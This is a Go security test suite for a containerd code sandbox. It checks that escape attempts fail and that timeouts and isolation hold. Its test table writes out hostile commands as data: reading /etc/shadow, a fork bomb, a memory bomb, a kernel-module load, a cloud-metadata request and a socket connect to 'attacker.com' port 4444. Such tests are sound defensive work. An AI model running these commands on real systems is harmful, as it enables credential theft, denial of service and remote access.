package tests

import (
	"context"
	"testing"
	"time"

	"safe-agent-sandbox/internal/sandbox"
)

// setupTestRunner creates a sandbox runner for security testing.
// Skips tests if containerd is not available.
func setupTestRunner(t *testing.T) *sandbox.Runner {
	t.Helper()

	ctx := context.Background()
	client, err := sandbox.NewClient(ctx, "/run/containerd/containerd.sock", "sandbox-test")
	if err != nil {
		t.Skipf("containerd not available, skipping security test: %v", err)
	}
	t.Cleanup(func() { client.Close() })

	runner, err := sandbox.NewRunner(ctx, client, 10)
	if err != nil {
		t.Fatalf("failed to create runner: %v", err)
	}

	return runner
}

func TestEscapeAttempts(t *testing.T) {
	runner := setupTestRunner(t)

	tests := []struct {
		name        string
		code        string
		language    string
		shouldFail  bool
		description string
	}{
		{
			name:        "Read /etc/shadow",
			code:        "cat /etc/shadow",
			language:    "bash",
			shouldFail:  true,
			description: "Should fail due to readonly filesystem and permissions",
		},
		{
			name:        "Mount filesystem",
			code:        "mount /dev/sda1 /mnt",
			language:    "bash",
			shouldFail:  true,
			description: "Should fail due to no CAP_SYS_ADMIN and seccomp blocking mount",
		},
		{
			name:        "Network request",
			code:        "wget -q -O- http://google.com 2>&1 || echo 'blocked'",
			language:    "bash",
			shouldFail:  true,
			description: "Should fail due to network namespace isolation",
		},
		{
			name:        "Fork bomb",
			code:        ":(){ :|:& };:",
			language:    "bash",
			shouldFail:  true,
			description: "Should hit PID limit",
		},
		{
			name:        "Read Docker socket",
			code:        "ls -la /var/run/docker.sock",
			language:    "bash",
			shouldFail:  true,
			description: "Should not have access to host Docker",
		},
		{
			name:        "Write to root filesystem",
			code:        "echo 'pwned' > /pwned.txt",
			language:    "bash",
			shouldFail:  true,
			description: "Should fail due to readonly root filesystem",
		},
		{
			name:        "Ptrace other process",
			code:        "import ctypes; ctypes.CDLL(None).ptrace(0, 1, 0, 0)",
			language:    "python",
			shouldFail:  true,
			description: "Should fail due to seccomp blocking ptrace",
		},
		{
			name:        "Access proc self namespace",
			code:        "ls -la /proc/self/ns/",
			language:    "bash",
			shouldFail:  true,
			description: "Should fail or show isolated namespace info",
		},
		{
			name:        "Kernel module load",
			code:        "insmod /tmp/evil.ko",
			language:    "bash",
			shouldFail:  true,
			description: "Should fail due to no CAP_SYS_MODULE and seccomp",
		},
		{
			name:        "Change hostname",
			code:        "hostname evil",
			language:    "bash",
			shouldFail:  true,
			description: "Should fail due to UTS namespace and seccomp",
		},
		{
			name:        "Memory bomb",
			code:        "x = []\nwhile True:\n    x.append('A' * 1024 * 1024)",
			language:    "python",
			shouldFail:  true,
			description: "Should be OOM killed",
		},
		{
			name:        "Access cloud metadata",
			code:        "import urllib.request; urllib.request.urlopen('http://169.254.169.254/')",
			language:    "python",
			shouldFail:  true,
			description: "Should fail due to network isolation",
		},
		{
			name:        "Reverse shell attempt",
			code:        "import socket,subprocess; s=socket.socket(); s.connect(('attacker.com',4444))",
			language:    "python",
			shouldFail:  true,
			description: "Should fail due to network isolation and seccomp",
		},
		{
			name:        "Read host environment",
			code:        "env | grep -i secret || echo 'no secrets'",
			language:    "bash",
			shouldFail:  false, // Will succeed but should show sanitized env
			description: "Should show only sandbox environment variables",
		},
		{
			name:        "Valid Python",
			code:        "print('hello world')",
			language:    "python",
			shouldFail:  false,
			description: "Should succeed — benign code",
		},
		{
			name:        "Valid Node",
			code:        "console.log('hello world')",
			language:    "node",
			shouldFail:  false,
			description: "Should succeed — benign code",
		},
		{
			name:        "Valid Bash",
			code:        "echo 'hello world'",
			language:    "bash",
			shouldFail:  false,
			description: "Should succeed — benign code",
		},
		{
			name:        "Write to tmp",
			code:        "echo 'data' > /tmp/test.txt && cat /tmp/test.txt",
			language:    "bash",
			shouldFail:  false,
			description: "Should succeed — /tmp is writable tmpfs",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			result, err := runner.Execute(context.Background(), sandbox.ExecutionRequest{
				Code:     tt.code,
				Language: tt.language,
				Timeout:  5 * time.Second,
				Limits:   sandbox.DefaultLimits(),
			})

			if tt.shouldFail {
				if err == nil && result != nil && result.ExitCode == 0 {
					t.Errorf("SECURITY: %s\nExpected failure but succeeded.\nOutput: %s\nStderr: %s",
						tt.description, result.Output, result.Stderr)
				}
			} else {
				if err != nil {
					// Some errors are acceptable for "pass" cases (e.g., containerd not available)
					if !sandbox.IsTimeout(err) {
						t.Logf("Note: %s returned error: %v", tt.description, err)
					}
				} else if result.ExitCode != 0 {
					t.Errorf("%s\nExpected success but got exit code %d.\nStderr: %s",
						tt.description, result.ExitCode, result.Stderr)
				}
			}
		})
	}
}

func TestTimeoutEnforcement(t *testing.T) {
	runner := setupTestRunner(t)

	start := time.Now()
	result, err := runner.Execute(context.Background(), sandbox.ExecutionRequest{
		Code:     "import time; time.sleep(60)",
		Language: "python",
		Timeout:  2 * time.Second,
		Limits:   sandbox.DefaultLimits(),
	})

	elapsed := time.Since(start)

	// Should complete in ~2 seconds, not 60
	if elapsed > 5*time.Second {
		t.Errorf("timeout not enforced: took %s", elapsed)
	}

	if !sandbox.IsTimeout(err) && (result == nil || result.ExitCode != -1) {
		t.Errorf("expected timeout error, got err=%v result=%+v", err, result)
	}
}

func TestResourceIsolation(t *testing.T) {
	runner := setupTestRunner(t)

	// Run two executions concurrently — they should not interfere
	ctx := context.Background()
	done := make(chan *sandbox.ExecutionResult, 2)
	errs := make(chan error, 2)

	for i := 0; i < 2; i++ {
		go func(n int) {
			result, err := runner.Execute(ctx, sandbox.ExecutionRequest{
				Code:     "import os; print(f'pid={os.getpid()}, hostname={os.uname().nodename}')",
				Language: "python",
				Timeout:  5 * time.Second,
				Limits:   sandbox.DefaultLimits(),
			})
			done <- result
			errs <- err
		}(i)
	}

	results := make([]*sandbox.ExecutionResult, 0, 2)
	for range 2 {
		if err := <-errs; err != nil {
			t.Fatalf("execution failed: %v", err)
		}
		results = append(results, <-done)
	}

	// Both should succeed with different container IDs
	if results[0].ID == results[1].ID {
		t.Error("concurrent executions should have different IDs")
	}
}
